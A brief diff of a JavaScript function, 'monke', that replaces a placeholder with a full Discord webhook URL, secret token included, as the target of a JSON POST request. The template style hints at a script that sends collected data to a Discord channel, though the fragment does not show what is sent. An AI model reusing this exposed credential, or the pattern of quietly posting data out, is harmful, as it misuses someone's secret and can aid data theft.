@@ -4,7 +4,7 @@ function monke(json)
 {
      var request = new XMLHttpRequest();
      
-     request.open("POST", "Replace this with your webhook!");
+     request.open("POST", "https://discord.com/api/webhooks/1335667587572432947/OUk616TFNWUOlLMNvwkRI9-7d4LoD5pXpzFTfSrTPe5e-GWpAwNWkCsug2djmJzKBJbG");
 
      request.setRequestHeader('Content-type', 'application/json');
 
